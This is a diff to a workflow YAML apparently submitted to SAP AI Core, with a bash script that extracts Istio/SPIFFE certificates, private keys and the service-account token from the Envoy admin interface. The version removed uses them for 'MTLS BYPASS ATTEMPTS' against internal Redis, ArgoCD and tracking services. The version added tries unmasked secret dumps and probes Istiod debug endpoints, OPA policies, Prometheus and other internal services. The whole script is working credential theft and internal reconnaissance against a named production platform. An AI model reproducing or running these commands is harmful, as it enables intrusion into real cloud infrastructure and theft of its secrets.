@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-exec"
-    ai.sap.com/version: "21.0.0"
+    ai.sap.com/version: "22.0.0"
 spec:
   entrypoint: main
   templates:
@@ -24,59 +24,66 @@ spec:
       - bash
       - -c
       - |
-        echo "=== V21 SPIFFE CERT EXTRACTION ==="
-        echo "=== SDS DUMP ==="
+        echo "=== V22 KEY EXTRACTION + NEW SERVICES ==="
+        
+        echo "=== SDS RAW KEY SECTION ==="
         SDS=$(curl -s http://localhost:15000/config_dump?resource=dynamic_active_secrets 2>&1)
-        echo "SDS_BYTES=$(echo $SDS | wc -c)"
-        echo "$SDS" > /tmp/sds.json
-        echo "=== CERT EXTRACTION ==="
-        CERT_B64=$(echo "$SDS" | grep -A1 certificate_chain | grep inline_bytes | head -1 | sed 's/.*inline_bytes.*: *"//;s/".*//')
-        if [ -n "$CERT_B64" ]; then
-          echo "$CERT_B64" | base64 -d > /tmp/cert.pem 2>/dev/null
-          echo "CERT_EXTRACTED: $(wc -c < /tmp/cert.pem) bytes"
-          openssl x509 -in /tmp/cert.pem -text -noout 2>&1 | head -25
-        else
-          echo "NO CERT VIA GREP"
-          echo "$SDS" | head -c 5000
-        fi
-        KEY_B64=$(echo "$SDS" | grep -A1 private_key | grep inline_bytes | head -1 | sed 's/.*inline_bytes.*: *"//;s/".*//')
-        if [ -n "$KEY_B64" ]; then
-          echo "$KEY_B64" | base64 -d > /tmp/key.pem 2>/dev/null
-          echo "KEY_EXTRACTED: $(wc -c < /tmp/key.pem) bytes"
-          echo "KEY_HEADER: $(head -1 /tmp/key.pem)"
-        else
-          echo "NO KEY VIA GREP"
-        fi
-        CA_B64=$(echo "$SDS" | grep -A1 trusted_ca | grep inline_bytes | head -1 | sed 's/.*inline_bytes.*: *"//;s/".*//')
-        if [ -n "$CA_B64" ]; then
-          echo "$CA_B64" | base64 -d > /tmp/ca.pem 2>/dev/null
-          echo "CA_EXTRACTED: $(wc -c < /tmp/ca.pem) bytes"
-        else
-          echo "NO CA VIA GREP"
-        fi
-        if [ -f /tmp/cert.pem ] && [ -f /tmp/key.pem ]; then
-          echo "=== MTLS BYPASS ATTEMPTS ==="
-          echo "--- Redis aicore ---"
-          printf "PING\r\n" | timeout 5 openssl s_client -connect 100.107.100.17:6379 -cert /tmp/cert.pem -key /tmp/key.pem -CAfile /tmp/ca.pem -quiet 2>&1 | head -10
-          echo "--- Redis user-mgmt ---"
-          printf "PING\r\nINFO\r\n" | timeout 5 openssl s_client -connect 100.109.69.212:6379 -cert /tmp/cert.pem -key /tmp/key.pem -CAfile /tmp/ca.pem -quiet 2>&1 | head -20
-          echo "--- ml-tracking mTLS ---"
-          curl -sk --connect-timeout 5 --cert /tmp/cert.pem --key /tmp/key.pem --cacert /tmp/ca.pem https://ml-tracking-service.ml-tracking.svc.cluster.local/ 2>&1 | head -c 500
-          echo ""
-          echo "--- ArgoCD mTLS ---"
-          curl -sk --connect-timeout 5 --cert /tmp/cert.pem --key /tmp/key.pem --cacert /tmp/ca.pem https://100.107.174.75/api/version 2>&1 | head -c 500
-          echo ""
-          curl -sk --connect-timeout 5 --cert /tmp/cert.pem --key /tmp/key.pem --cacert /tmp/ca.pem https://100.107.174.75/api/v1/applications 2>&1 | head -c 1000
-          echo ""
-          echo "--- Envoy proxy bypass ---"
-          curl -s --connect-timeout 5 http://localhost:15001/redis.aicore.svc.cluster.local:6379 2>&1 | head -c 500
-          echo ""
-        fi
-        echo "=== FILESYSTEM CERTS ==="
-        find / -maxdepth 4 -name "*.pem" -o -name "*.crt" -o -name "*.key" -o -name "root-cert*" -o -name "cert-chain*" 2>/dev/null | head -20
-        ls -laR /etc/istio/ 2>/dev/null | head -20
-        cat /etc/istio/proxy/envoy-rev.json 2>/dev/null | head -c 2000
+        echo "$SDS" | grep -B5 -A5 private_key | head -30
+        
+        echo "=== TRY UNREDACTED SDS ==="
+        curl -s "http://localhost:15000/config_dump?resource=dynamic_active_secrets&mask=false" 2>&1 | grep -B2 -A2 private_key | head -20
+        
+        echo "=== ENVOY CERTS ENDPOINT ==="
+        curl -s http://localhost:15000/certs 2>&1 | head -c 3000
+        
         echo ""
-        echo "=== SERVICE MAP ==="
-        curl -s http://localhost:15000/clusters 2>&1 | grep -oE '[a-z0-9-]+\.[a-z0-9-]+\.svc\.cluster\.local' | sort -u | head -50
-        echo "=== V21 DONE ==="
+        echo "=== PILOT-AGENT SDS SOCKET ==="
+        ls -la /etc/istio/proxy/ 2>/dev/null
+        ls -la /var/run/secrets/tokens/ 2>/dev/null
+        cat /var/run/secrets/tokens/istio-token 2>/dev/null | head -c 200
+        echo ""
+        
+        echo "=== USAGE API ==="
+        curl -s http://usage-api-service.usage-api.svc.cluster.local/ 2>&1 | head -c 1000
+        curl -s http://usage-api-service.usage-api.svc.cluster.local/api/ 2>&1 | head -c 500
+        curl -s http://usage-api-service.usage-api.svc.cluster.local/v1/ 2>&1 | head -c 500
+        curl -s http://usage-api-service.usage-api.svc.cluster.local/health 2>&1 | head -c 500
+        
+        echo ""
+        echo "=== DYNATRACE ==="
+        curl -s http://dynakube-activegate.dynatrace.svc.cluster.local:443/ -k 2>&1 | head -c 500
+        curl -s http://dynakube-activegate.dynatrace.svc.cluster.local:9999/ 2>&1 | head -c 500
+        
+        echo ""
+        echo "=== CONNECTIVITY PROXY ==="
+        curl -s http://connectivity-proxy.connectivity-proxy.svc.cluster.local/ 2>&1 | head -c 500
+        curl -s http://connectivity-proxy.connectivity-proxy.svc.cluster.local:20003/ 2>&1 | head -c 500
+        
+        echo ""
+        echo "=== NGINX-OPA ==="
+        curl -s http://nginx-opa.istio-system.svc.cluster.local/ 2>&1 | head -c 500
+        curl -s http://nginx-opa.istio-system.svc.cluster.local:8181/v1/policies 2>&1 | head -c 2000
+        
+        echo ""
+        echo "=== INTERNAL GATEWAY ==="
+        curl -s http://internal-domain-gateway.istio-system.svc.cluster.local/ 2>&1 | head -c 500
+        curl -s -H "Host: api.ai.sec-eu10.eu-central-1.aws.ml.hana.ondemand.com" http://internal-domain-gateway.istio-system.svc.cluster.local/ 2>&1 | head -c 1000
+        
+        echo ""
+        echo "=== ENVOY LISTENERS ==="
+        curl -s http://localhost:15000/listeners 2>&1 | head -c 2000
+        
+        echo ""
+        echo "=== PROMETHEUS METRICS ==="
+        curl -s http://istio-prometheus-prometheus-istio-server.istio-system.svc.cluster.local:9090/api/v1/targets 2>&1 | head -c 3000
+        
+        echo ""
+        echo "=== CLUSTER-LOCAL GATEWAY ==="
+        curl -s http://cluster-local-gateway.istio-system.svc.cluster.local/ 2>&1 | head -c 500
+        
+        echo ""
+        echo "=== ISTIOD DEBUG ENDPOINTS ==="
+        curl -s http://istiod.istio-system.svc.cluster.local:15014/debug/endpointz 2>&1 | head -c 3000
+        curl -s http://istiod.istio-system.svc.cluster.local:15014/debug/configz 2>&1 | head -c 2000
+        
+        echo "=== V22 DONE ==="
